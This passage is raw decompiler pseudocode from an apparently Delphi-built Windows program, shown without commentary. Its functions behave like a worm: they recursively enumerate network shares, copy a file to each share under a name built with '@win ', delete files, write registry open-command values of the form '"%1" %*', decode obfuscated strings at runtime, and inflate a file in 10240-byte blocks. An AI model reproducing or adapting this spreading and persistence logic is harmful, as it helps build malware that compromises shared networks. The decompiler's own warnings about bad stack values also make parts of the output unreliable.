  void *v10; // [esp-8h] [ebp-12Ch]
  int *v11; // [esp-4h] [ebp-128h]
  void *v12; // [esp+0h] [ebp-124h]
  __int32 v13; // [esp+8h] [ebp-11Ch] BYREF
  char *v14; // [esp+Ch] [ebp-118h] BYREF
  __int32 v15; // [esp+10h] [ebp-114h] BYREF
  char v16[256]; // [esp+14h] [ebp-110h] BYREF
  char *v17; // [esp+114h] [ebp-10h] BYREF
  char *v18; // [esp+118h] [ebp-Ch]
  char *v19; // [esp+11Ch] [ebp-8h]
  char *v20; // [esp+120h] [ebp-4h]
  int savedregs; // [esp+124h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v17 = 0;
  v18 = a3;
  v19 = a2;
  v20 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v19);
  sub_4038D8((int)v18);
  v11 = &savedregs;
  v10 = &loc_417EF5;
  ExceptionList = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(int))(*(_DWORD *)dword_41EF14 + 64))(ExceptionList);
  sub_417C20(v19, a5, a4, a6);
  sub_417C20(v18, a5, a4, a6);
  sub_415FAC((int)"9luv", 0, (volatile __int32 *)&v17);
  sub_403770(&dword_41EEF4, v20, v17);
  (*(void (**)(void))(*(_DWORD *)dword_41EF14 + 100))();
  sub_4071B8((char *)dword_41EEF4, 2u);
  v6 = (*(int (**)(void))(*(_DWORD *)dword_41EF14 + 20))();
  sub_40296C(v6, v16);
  sub_4036EC((char **)&dword_41EEF4, v16);
  ExceptionList = 1;
  sub_41620C((int)v20, &v14);
  v8 = v14;
  sub_403770(&v13, (char *)dword_41EEFC, "\\FA0");
  sub_415EAC(v13, v8, (char *)dword_41EEF4, &v15, 1, ExceptionList);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_417EFC;
  sub_4034EC((int)&v13, 3);
  return sub_4034EC((int)&v17, 4);
}
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF14: using guessed type int dword_41EF14;

//----- (00417F24) --------------------------------------------------------
int *__usercall sub_417F24@<eax>(int a1@<eax>, int a2@<edi>)
{
  char v2; // zf
  int v3; // ebx
  char *v5; // [esp-18h] [ebp-84h]
  unsigned int v6[2]; // [esp-Ch] [ebp-78h] BYREF
  int *v7; // [esp-4h] [ebp-70h]
  char *v8; // [esp+4h] [ebp-68h] BYREF
  __int32 v9; // [esp+8h] [ebp-64h] BYREF
  char *v10; // [esp+Ch] [ebp-60h] BYREF
  __int32 v11; // [esp+10h] [ebp-5Ch] BYREF
  char *v12; // [esp+14h] [ebp-58h] BYREF
  char *v13; // [esp+18h] [ebp-54h] BYREF
  __int32 v14; // [esp+1Ch] [ebp-50h] BYREF
  __int32 v15; // [esp+20h] [ebp-4Ch] BYREF
  __int32 v16; // [esp+24h] [ebp-48h] BYREF
  __int32 v17; // [esp+28h] [ebp-44h] BYREF
  char *v18; // [esp+2Ch] [ebp-40h] BYREF
  char *v19; // [esp+30h] [ebp-3Ch] BYREF
  __int32 v20; // [esp+34h] [ebp-38h] BYREF
  __int32 v21; // [esp+38h] [ebp-34h] BYREF
  __int32 v22; // [esp+3Ch] [ebp-30h] BYREF
  __int32 v23; // [esp+40h] [ebp-2Ch] BYREF
  __int32 v24; // [esp+44h] [ebp-28h] BYREF
  __int32 v25; // [esp+48h] [ebp-24h] BYREF
  __int32 v26; // [esp+4Ch] [ebp-20h] BYREF
  __int32 v27; // [esp+50h] [ebp-1Ch] BYREF
  __int32 v28; // [esp+54h] [ebp-18h] BYREF
  __int32 v29; // [esp+58h] [ebp-14h] BYREF
  char *v30; // [esp+5Ch] [ebp-10h] BYREF
  char *v31; // [esp+60h] [ebp-Ch] BYREF
  int v32; // [esp+64h] [ebp-8h]
  volatile __int32 *v33; // [esp+68h] [ebp-4h] BYREF
  int savedregs; // [esp+6Ch] [ebp+0h] BYREF

  v32 = a1;
  sub_4038D8(a1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_4182D1;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_415EAC(dword_41EEFC, (char *)dword_4182F4, (char *)dword_4182E8, &v29, 1, 1);
  dword_41EF14 = (int)sub_402BAC(&off_40BBB4, 1);
  dword_41EF18 = (int)sub_402BAC(&off_40BBB4, 1);
  sub_4045A0((int *)&v33, (int)dword_417C10, 1, 10);
  sub_415FAC((int)dword_418300, 0, &v28);
  sub_40351C(v33 + 1, v28);
  sub_415FAC((int)"sn~5:", 0, &v27);
  sub_40351C(v33 + 2, v27);
  sub_415FAC((int)"tx~5:", 0, &v26);
  sub_40351C(v33 + 3, v26);
  sub_415FAC((int)dword_418330, 0, &v25);
  sub_40351C(v33 + 4, v25);
  sub_415FAC((int)"67nzo", 0, &v24);
  sub_40351C(v33 + 5, v24);
  sub_415FAC((int)dword_418350, 0, &v23);
  sub_40351C(v33 + 6, v23);
  sub_415FAC((int)dword_418360, 0, &v22);
  sub_40351C(v33 + 7, v22);
  sub_415FAC((int)dword_418370, 0, &v21);
  sub_40351C(v33 + 8, v21);
  sub_415FAC((int)dword_418380, 0, &v20);
  sub_40351C(v33 + 9, v20);
  sub_415FAC((int)"Ojmsq", 0, (volatile __int32 *)&v19);
  sub_415EAC(dword_41EEEC, v19, 0, (volatile __int32 *)&v30, 0, 0);
  sub_415FAC((int)dword_4183A0, 0, (volatile __int32 *)&v18);
  sub_403770((volatile __int32 *)&v31, (char *)dword_41EEE8, v18);
  if ( !v32 )
  {
    sub_403770(&v17, v31, (char *)dword_4183AC);
    sub_417C88(v30, v17, 1, a2, 1, (int)&savedregs);
    sub_403770(&v16, v31, (char *)dword_4183B8);
    sub_417C88(v30, v16, 2, a2, 3, (int)&savedregs);
    sub_403770(&v15, v31, (char *)dword_4183C4);
    sub_417C88(v30, v15, 4, a2, 4, (int)&savedregs);
    sub_403770(&v14, v31, (char *)dword_4183D0);
    sub_417C88((char *)dword_41EEE0, v14, 4, a2, 4, (int)&savedregs);
  }
  if ( !v32 || (sub_403834(v32, dword_4183DC), v2) )
  {
    sub_415FAC((int)dword_4183E8, 0, &v11);
    sub_415EAC(v11, 0, 0, (volatile __int32 *)&v12, 0, 0);
    sub_4073B8(v12, &v13);
    sub_40351C(&dword_41EEF4, (__int32)v13);
    if ( dword_41EEF4 )
    {
      v3 = sub_403724(dword_41EEF4);
      sub_4038F4((char **)&dword_41EEF4)[v3 - 1] = 32;
    }
    else
    {
      sub_40351C(&dword_41EEF4, dword_41EEE8);
    }
    sub_406EEC(dword_41EEF4, &v10);
    v5 = v10;
    sub_403770(&v9, v31, (char *)dword_41841C);
    sub_417C88(v5, v9, 9, a2, 9, (int)&savedregs);
  }
  if ( !v32 || (sub_403834(v32, dword_418428), v2) )
  {
    sub_403770((volatile __int32 *)&v8, v31, (char *)&dword_418434);
    sub_417D9C(v8, (char *)dword_41EEE0, (char *)dword_41EEE4, 7, 5, (int)&savedregs);
  }
  sub_402BDC((_DWORD *)dword_41EF14);
  sub_402BDC((_DWORD *)dword_41EF18);
  sub_4045AC((int *)&v33, (int)dword_417C10);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_4182D8;
  sub_4034EC((int)&v8, 25);
  return sub_4045AC((int *)&v33, (int)dword_417C10);
}
// 41819D: variable 'v2' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 417C10: using guessed type int dword_417C10[2];
// 4182E8: using guessed type int dword_4182E8[3];
// 4182F4: using guessed type int dword_4182F4[3];
// 418300: using guessed type int dword_418300[4];
// 418330: using guessed type int dword_418330[4];
// 418350: using guessed type int dword_418350[4];
// 418360: using guessed type int dword_418360[4];
// 418370: using guessed type int dword_418370[4];
// 418380: using guessed type int dword_418380[4];
// 4183A0: using guessed type int dword_4183A0[3];
// 4183AC: using guessed type int dword_4183AC[3];
// 4183B8: using guessed type int dword_4183B8[3];
// 4183C4: using guessed type int dword_4183C4[3];
// 4183D0: using guessed type int dword_4183D0[3];
// 4183DC: using guessed type int dword_4183DC[3];
// 4183E8: using guessed type int dword_4183E8[13];
// 41841C: using guessed type int dword_41841C[3];
// 418428: using guessed type int dword_418428[3];
// 418434: using guessed type int dword_418434;
// 41EEE0: using guessed type int dword_41EEE0;
// 41EEE4: using guessed type int dword_41EEE4;
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEEC: using guessed type int dword_41EEEC;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF14: using guessed type int dword_41EF14;
// 41EF18: using guessed type int dword_41EF18;

//----- (00418438) --------------------------------------------------------
int __usercall sub_418438@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  _DWORD *v2; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-1E0h] BYREF
  int *v5; // [esp-4h] [ebp-1D8h]
  int v6[115]; // [esp+0h] [ebp-1D4h] BYREF
  char *v7; // [esp+1CCh] [ebp-8h] BYREF
  char *v8; // [esp+1D0h] [ebp-4h]
  int savedregs; // [esp+1D4h] [ebp+0h] BYREF

  v7 = a2;
  v8 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v7);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4184B7;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_404E16(v6, v8);
  sub_405005((int)v6);
  v2 = sub_403A60(v6, v7);
  sub_40520F(v2);
  sub_404F80((int)v6);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4184BE;
  return sub_4034EC((int)&v7, 2);
}
// 418438: using guessed type _DWORD var_1D4[115];

//----- (004184C4) --------------------------------------------------------
_DWORD *__usercall sub_4184C4@<eax>(struct _NETRESOURCEA *a1@<eax>, int a2)
{
  DWORD v2; // esi
  char *v3; // ebx
  char *v4; // eax
  char *v6; // [esp-10h] [ebp-CE8h]
  char *v7; // [esp-10h] [ebp-CE8h]
  char *v8[2]; // [esp-Ch] [ebp-CE4h] BYREF
  int *v9; // [esp-4h] [ebp-CDCh]
  __int32 v10; // [esp+8h] [ebp-CD0h] BYREF
  char *v11; // [esp+Ch] [ebp-CCCh] BYREF
  __int32 v12; // [esp+10h] [ebp-CC8h] BYREF
  __int32 v13; // [esp+14h] [ebp-CC4h] BYREF
  char *v14; // [esp+18h] [ebp-CC0h] BYREF
  __int32 v15; // [esp+1Ch] [ebp-CBCh] BYREF
  __int32 v16; // [esp+20h] [ebp-CB8h] BYREF
  __int32 v17; // [esp+24h] [ebp-CB4h] BYREF
  char *v18; // [esp+28h] [ebp-CB0h] BYREF
  char *v19; // [esp+2Ch] [ebp-CACh] BYREF
  char *v20; // [esp+30h] [ebp-CA8h] BYREF
  char *v21; // [esp+34h] [ebp-CA4h] BYREF
  char v22[4]; // [esp+38h] [ebp-CA0h] BYREF
  char v23[4]; // [esp+3Ch] [ebp-C9Ch] BYREF
  char *v24; // [esp+40h] [ebp-C98h] BYREF
  __int32 v25; // [esp+44h] [ebp-C94h] BYREF
  char Buffer[12]; // [esp+48h] [ebp-C90h] BYREF
  char v27; // [esp+54h] [ebp-C84h] BYREF
  char *v28; // [esp+CC8h] [ebp-10h] BYREF
  DWORD BufferSize; // [esp+CCCh] [ebp-Ch] BYREF
  DWORD cCount; // [esp+CD0h] [ebp-8h] BYREF
  HANDLE hEnum; // [esp+CD4h] [ebp-4h] BYREF
  int savedregs; // [esp+CD8h] [ebp+0h] BYREF

  v9 = &savedregs;
  v8[1] = (char *)&loc_4187C9;
  v8[0] = (char *)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  BufferSize = 3200;
  if ( !WNetOpenEnumA(2u, 0, 0, a1, &hEnum) )
  {
    cCount = 100;
    WNetEnumResourceA(hEnum, &cCount, Buffer, &BufferSize);
    v2 = cCount;
    if ( (int)cCount > 0 )
    {
      v3 = &v27;
      do
      {
        if ( (*(_DWORD *)v3 & 2) == 2 )
        {
          sub_4184C4((struct _NETRESOURCEA *)(v3 - 12), a2);
        }
        else if ( (*((_DWORD *)v3 - 2) & 1) == 1 )
        {
          sub_403680(&v28, *((char **)v3 + 2));
          sub_415FAC((int)dword_4187E0, 0, &v25);
          sub_40351C(&dword_41EEF4, v25);
          v23[1] = *(_BYTE *)dword_41EEE8;
          v23[0] = 1;
          sub_402848(v22, v23);
          sub_402818((unsigned __int8 *)v22, (unsigned __int8 *)dword_4187F8, 2u);
          sub_4036EC(&v24, v22);
          sub_40372C(&v24, dword_41EEF4);
          v6 = v24;
          sub_403770((volatile __int32 *)&v21, v28, (char *)dword_41EEF4);
          if ( (unsigned __int8)sub_416178(v6, v21, 1) )
          {
            sub_415FAC((int)dword_418804, 0, (volatile __int32 *)&v19);
            sub_403770((volatile __int32 *)&v20, v28, v19);
            v7 = v20;
            sub_403770((volatile __int32 *)&v18, "@win ", (char *)dword_41EEF4);
            sub_418438(v7, v18);
            sub_415FAC((int)dword_41882C, 0, &v17);
            sub_40351C(&dword_41EEF4, v17);
            sub_415FAC((int)dword_418844, 0, &v15);
            sub_4037E4(&v16, 3);
            sub_415FAC((int)dword_418854, 0, &v13);
            sub_4037E4((volatile __int32 *)&v14, 3);
            sub_416178(v14, v8[0], 1);
            v8[0] = v28;
            sub_415FAC((int)dword_418854, 0, &v12);
            sub_4037E4(&dword_41EEF4, 3);
            v4 = sub_4038E8((char *)dword_41EEF4);
            DeleteFileA(v4);
            sub_403670(&v11);
            sub_415FAC((int)dword_418868, 0, &v10);
            sub_40372C(&v11, v10);
            sub_416178(v11, (char *)dword_41EEF4, 0);
          }
        }
        v3 += 32;
        --v2;
      }
      while ( v2 );
    }
  }
  __writefsdword(0, (unsigned int)v8[0]);
  v9 = (int *)&loc_4187D0;
  sub_4034EC((int)&v10, 12);
  sub_4034EC((int)&v24, 2);
  return sub_4034C8(&v28);
}
// 4187E0: using guessed type int dword_4187E0[6];
// 4187F8: using guessed type int dword_4187F8[3];
// 418804: using guessed type int dword_418804[6];
// 41882C: using guessed type int dword_41882C[4];
// 418844: using guessed type int dword_418844[4];
// 418854: using guessed type int dword_418854[5];
// 418868: using guessed type int dword_418868[6];
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEF4: using guessed type int dword_41EEF4;
// 4184C4: using guessed type char Buffer[12];
// 4184C4: using guessed type char var_C9C[4];
// 4184C4: using guessed type char var_CA0[4];

//----- (00418880) --------------------------------------------------------
int __usercall sub_418880@<eax>(char *a1@<eax>)
{
  char v1; // zf
  char *v3; // [esp-1Ch] [ebp-7Ch]
  char *v4; // [esp-1Ch] [ebp-7Ch]
  int ExceptionList; // [esp-Ch] [ebp-6Ch] BYREF
  void *v6; // [esp-8h] [ebp-68h]
  int *v7; // [esp-4h] [ebp-64h]
  void *v8; // [esp+0h] [ebp-60h]
  char *v9; // [esp+4h] [ebp-5Ch] BYREF
  char *v10; // [esp+8h] [ebp-58h] BYREF
  char *v11; // [esp+Ch] [ebp-54h] BYREF
  __int32 v12; // [esp+10h] [ebp-50h] BYREF
  char *v13; // [esp+14h] [ebp-4Ch] BYREF
  __int32 v14; // [esp+18h] [ebp-48h] BYREF
  char *v15; // [esp+1Ch] [ebp-44h] BYREF
  __int32 v16; // [esp+20h] [ebp-40h] BYREF
  char *v17[2]; // [esp+24h] [ebp-3Ch] BYREF
  char *v18; // [esp+2Ch] [ebp-34h] BYREF
  __int32 v19; // [esp+30h] [ebp-30h] BYREF
  char *v20; // [esp+34h] [ebp-2Ch] BYREF
  char *v21; // [esp+38h] [ebp-28h] BYREF
  __int32 v22; // [esp+3Ch] [ebp-24h] BYREF
  char *v23; // [esp+40h] [ebp-20h] BYREF
  char *v24; // [esp+44h] [ebp-1Ch] BYREF
  __int32 v25; // [esp+48h] [ebp-18h] BYREF
  char *v26; // [esp+4Ch] [ebp-14h] BYREF
  __int32 v27; // [esp+50h] [ebp-10h] BYREF
  __int32 v28; // [esp+54h] [ebp-Ch] BYREF
  __int32 v29; // [esp+58h] [ebp-8h] BYREF
  char *v30; // [esp+5Ch] [ebp-4h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v30 = a1;
  sub_4038D8((int)a1);
  v7 = &savedregs;
  v6 = &loc_418B06;
  ExceptionList = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_415EAC(dword_41EEFC, (char *)dword_418B28, (char *)dword_418B1C, &v28, 1, 1);
  sub_415FAC((int)dword_418B34, 0, &v27);
  sub_40351C(&dword_41EEF4, v27);
  sub_403770((volatile __int32 *)&v26, (char *)dword_41EEE8, (char *)dword_41EEF4);
  sub_416178(v30, v26, 1);
  sub_415FAC((int)dword_418B48, 0, &v29);
  sub_415FAC((int)dword_418B88, 0, (volatile __int32 *)&v24);
  v3 = v24;
  sub_403770((volatile __int32 *)&v23, (char *)dword_41EEE8, (char *)dword_41EEF4);
  sub_415EAC(v29, v3, v23, &v25, 1, 0);
  if ( !v25 )
  {
    sub_415FAC((int)dword_418B88, 0, (volatile __int32 *)&v21);
    v4 = v21;
    sub_403770((volatile __int32 *)&v20, (char *)dword_41EEE8, (char *)dword_41EEF4);
    sub_415EAC(v29, v4, v20, &v22, 1, 1);
  }
  sub_415FAC((int)dword_418B9C, 0, &v19);
  sub_40351C(&dword_41EEF4, v19);
  sub_403770((volatile __int32 *)&v18, (char *)dword_41EEF0, (char *)dword_41EEF4);
  sub_416178(v30, v18, 1);
  sub_415FAC((int)dword_418BB0, 0, &v29);
  sub_4037E4((volatile __int32 *)v17, 4);
  sub_415EAC(v29, 0, v17[0], (volatile __int32 *)2, 0, ExceptionList);
  sub_403834((int)v17[1], (int *)"\"%1\" %*");
  if ( v1 )
  {
    ExceptionList = 1;
    sub_4037E4((volatile __int32 *)&v15, 4);
    sub_415EAC(v29, 0, v15, &v16, 2, ExceptionList);
  }
  sub_4184C4(0, (int)&savedregs);
  if ( sub_4028F4(0x21u) == 8 )
  {
    sub_415FAC((int)dword_418C04, 0, &v14);
    sub_40351C(&dword_41EEF4, v14);
    sub_403770((volatile __int32 *)&v13, (char *)dword_41EEF8, (char *)dword_41EEF4);
    sub_416178(v30, v13, 1);
    ExceptionList = 0;
    sub_415FAC((int)dword_418C18, 0, (volatile __int32 *)&v11);
    sub_415EAC(dword_41EEEC, v11, 0, &v12, 0, ExceptionList);
    sub_40351C(&dword_41EEF4, v12);
    sub_415FAC((int)dword_418C28, 0, (volatile __int32 *)&v9);
    sub_403770((volatile __int32 *)&v10, (char *)dword_41EEF4, v9);
    sub_416178(v30, v10, 0);
  }
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_418B0D;
  return sub_4034EC((int)&v9, 23);
}
// 418A0A: variable 'v1' is possibly undefined
// 418B1C: using guessed type int dword_418B1C[3];
// 418B28: using guessed type int dword_418B28[3];
// 418B34: using guessed type int dword_418B34[5];
// 418B48: using guessed type int dword_418B48[16];
// 418B88: using guessed type int dword_418B88[3];
// 418B9C: using guessed type int dword_418B9C[5];
// 418BB0: using guessed type int dword_418BB0[9];
// 418C04: using guessed type int dword_418C04[5];
// 418C18: using guessed type int dword_418C18[4];
// 418C28: using guessed type int dword_418C28[8];
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEEC: using guessed type int dword_41EEEC;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEF8: using guessed type int dword_41EEF8;
// 41EEFC: using guessed type int dword_41EEFC;

//----- (00418C48) --------------------------------------------------------
int __userpurge sub_418C48@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<esi>, __int64 a5)
{
  int v5; // esi
  char *v6; // ecx
  __int64 v7; // rax
  unsigned int v9[2]; // [esp-14h] [ebp-2978h] BYREF
  int *v10; // [esp-Ch] [ebp-2970h]
  int v11; // [esp-8h] [ebp-296Ch]
  int v12; // [esp-4h] [ebp-2968h]
  char v13[10240]; // [esp+0h] [ebp-2964h] BYREF
  int v14[83]; // [esp+2800h] [ebp-164h] BYREF
  __int64 v15; // [esp+294Ch] [ebp-18h]
  int v16; // [esp+2958h] [ebp-Ch] BYREF
  int v17; // [esp+295Ch] [ebp-8h] BYREF
  char *v18; // [esp+2960h] [ebp-4h]
  int savedregs; // [esp+2964h] [ebp+0h] BYREF
  __int64 v20; // [esp+296Ch] [ebp+8h]

  v12 = a3;
  v11 = a4;
  v17 = a2;
  v18 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v17);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_418DB9;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v15 = 1i64;
  v5 = sub_403724(v17);
  v16 = 1;
  v6 = v13;
  do
  {
    if ( v5 < v15 )
      v15 = 1i64;
    *v6 = *(_BYTE *)(v17 + v15++ - 1);
    ++v16;
    ++v6;
  }
  while ( v16 != 10241 );
  v15 = 0i64;
  LODWORD(v7) = sub_4055D6(a5 - 640, 0x2800u, 0);
  v20 = v7;
  --v16;
  sub_404E16(v14, v18);
  *off_41DC30 = 0;
  sub_405124((int)v14, 1);
  sub_40265C();
  while ( v20 > v15 )
  {
    sub_404F1C((int)v14, v13, v16, (DWORD *)&v16);
    sub_40265C();
    ++v15;
  }
  sub_404F80((int)v14);
  sub_40265C();
  sub_4071B8(v18, 2u);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_418DC0;
  return sub_4034EC((int)&v17, 2);
}
// 418C48: could not find valid save-restore pair for ebx
// 418C48: could not find valid save-restore pair for esi
// 418D17: variable 'v7' is possibly undefined
// 41DC30: using guessed type char *off_41DC30;
// 418C48: using guessed type _DWORD var_164[83];

//----- (00418DC8) --------------------------------------------------------
_DWORD *__usercall sub_418DC8@<eax>(char *a1@<eax>)
{
  char *v1; // eax
  ATOM AtomA; // bx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char *v6; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = a1;
  sub_4038D8((int)a1);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_418E17;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  do
  {
    v1 = sub_4038E8(v6);
    AtomA = GlobalFindAtomA(v1);
    GlobalDeleteAtom(AtomA);
  }
  while ( AtomA );
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_418E1E;
  return sub_4034C8(&v6);
}

//----- (00418E24) --------------------------------------------------------
char __usercall sub_418E24@<al>(char *a1@<eax>, char *a2@<edx>, FARPROC *a3@<ecx>)
{
  char *v4; // ebx
  HMODULE ModuleHandleA_1; // ebx
  char *v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  char v10; // [esp+Bh] [ebp-9h]
  char *v11; // [esp+Ch] [ebp-8h] BYREF
  char *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = a2;
  v12 = a1;
  sub_4038D8((int)a1);
  sub_4038D8((int)v11);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_418EAB;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v10 = 0;
  v4 = sub_4038E8(v12);
  if ( LoadLibraryA(v4) )
  {
    ModuleHandleA_1 = GetModuleHandleA_1(v4);
    if ( ModuleHandleA_1 )
    {
      v6 = sub_4038E8(v11);
      *a3 = GetProcAddress_0(ModuleHandleA_1, v6);
      if ( *a3 )
        v10 = 1;
    }
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_418EB2;
  sub_4034EC((int)&v11, 2);
  return v10;
}

//----- (00418EBC) --------------------------------------------------------
int __usercall sub_418EBC@<eax>(char a1@<al>, int a2@<ebx>)
{
  char v2; // zf
  int v3; // eax
  bool v4; // bl
  int v5; // eax
  int v6; // ebx
  unsigned int v8[2]; // [esp-10h] [ebp-24h] BYREF
  int *v9; // [esp-8h] [ebp-1Ch]
  int v10; // [esp-4h] [ebp-18h]
  __int32 v11; // [esp+0h] [ebp-14h] BYREF
  __int32 v12; // [esp+4h] [ebp-10h] BYREF
  char *v13; // [esp+8h] [ebp-Ch] BYREF
  DWORD dwFlags; // [esp+Ch] [ebp-8h] BYREF
  int v15; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v15 = 0;
  dwFlags = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = a2;
  HIBYTE(v15) = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_418F7C;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_415EAC(dword_41EEFC, (char *)dword_418F94, 0, &v12, 1, 0);
  sub_403834(v12, dword_418FA0);
  if ( v2 )
  {
    v3 = -InternetGetConnectedState(&dwFlags, 0);
    v4 = v3 != 0;
    if ( v3 )
      sub_403560((volatile __int32 *)&v13, (__int32)dword_418FAC);
    else
      sub_403560((volatile __int32 *)&v13, (__int32)dword_418FA0);
    v5 = sub_415EAC(dword_41EEFC, (char *)sub_418FB8, v13, &v11, 1, 1);
    if ( v4 && HIBYTE(v15) )
      LOBYTE(v5) = 1;
    else
      v5 = 0;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_418F83;
  sub_4034EC((int)&v11, 3);
  return v6;
}
// 418EBC: could not find valid save-restore pair for ebx
// 418EFE: variable 'v2' is possibly undefined
// 418F94: using guessed type int dword_418F94[3];
// 418FA0: using guessed type int dword_418FA0[3];
// 418FAC: using guessed type int dword_418FAC[3];
// 41EEFC: using guessed type int dword_41EEFC;

//----- (00418FB8) --------------------------------------------------------
char __usercall sub_418FB8@<al>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  return sub_418FBC(a1, a2, a3 + 1);
}

//----- (00418FBC) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __usercall sub_418FBC@<al>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  unsigned int v4[2]; // [esp-18h] [ebp-24h] BYREF
  void **v5; // [esp-10h] [ebp-1Ch]
  _DWORD v6[3]; // [esp-Ch] [ebp-18h] BYREF
  _DWORD *v7; // [esp+0h] [ebp-Ch]
  unsigned int v8; // [esp+4h] [ebp-8h]
  __int32 v9; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = a1;
  sub_4038D8(a1);
  v6[2] = &savedregs;
  v6[1] = &loc_419052;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v7 = sub_412D28(dword_412D04, 1);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_419035;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_40351C(v7 + 3, v9);
  HIBYTE(v8) = sub_412EA0((int)v7, a2);
  if ( HIBYTE(v8) )
    sub_412F7C((int)v7, a2, a3);
  __writefsdword(0, v4[0]);
  v5 = (void **)&loc_41903C;
  sub_402BDC(v7);
  __writefsdword(0, v8);
  savedregs = &loc_419059;
  sub_4034C8(&v9);
  return HIBYTE(v8);
}
// 41904C: bad sp value at call
// 412D04: using guessed type int dword_412D04[2];

//----- (00419074) --------------------------------------------------------
volatile __int32 *__usercall sub_419074@<eax>(volatile __int32 *a1@<eax>)
{
  volatile __int32 *result; // eax
  DWORD dwFlags; // [esp+4h] [ebp-4h] BYREF

  sub_40351C(a1, (__int32)dword_4190BC);
  result = (volatile __int32 *)InternetGetConnectedState(&dwFlags, 0);
  if ( result )
  {
    result = (volatile __int32 *)(dwFlags & 1);
    if ( result == (volatile __int32 *)1 )
      return sub_40351C(a1, (__int32)&dword_4190C8);
  }
  return result;
}
// 4190BC: using guessed type int dword_4190BC[3];
// 4190C8: using guessed type int dword_4190C8;

//----- (004190CC) --------------------------------------------------------
int __usercall sub_4190CC@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // ebx
  LANGID UserDefaultLangID; // ax
  char v4; // zf
  int v5; // eax
  int v6; // eax
  int v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // ebx
  _BYTE *v9; // eax
  char *v11; // [esp-18h] [ebp-2B4h]
  volatile __int32 *v12; // [esp-14h] [ebp-2B0h] BYREF
  int v13; // [esp-10h] [ebp-2ACh]
  int ExceptionList; // [esp-Ch] [ebp-2A8h] BYREF
  void *v15; // [esp-8h] [ebp-2A4h]
  int *v16; // [esp-4h] [ebp-2A0h]
  void *v17; // [esp+0h] [ebp-29Ch]
  __int32 v18; // [esp+4h] [ebp-298h] BYREF
  __int32 v19; // [esp+8h] [ebp-294h] BYREF
  char *v20; // [esp+Ch] [ebp-290h] BYREF
  char v21; // [esp+10h] [ebp-28Ch] BYREF
  __int32 v22; // [esp+14h] [ebp-288h] BYREF
  __int32 v23; // [esp+18h] [ebp-284h] BYREF
  __int32 v24; // [esp+1Ch] [ebp-280h] BYREF
  __int32 v25; // [esp+20h] [ebp-27Ch] BYREF
  int v26; // [esp+24h] [ebp-278h] BYREF
  __int32 v27; // [esp+28h] [ebp-274h] BYREF
  __int32 v28; // [esp+2Ch] [ebp-270h] BYREF
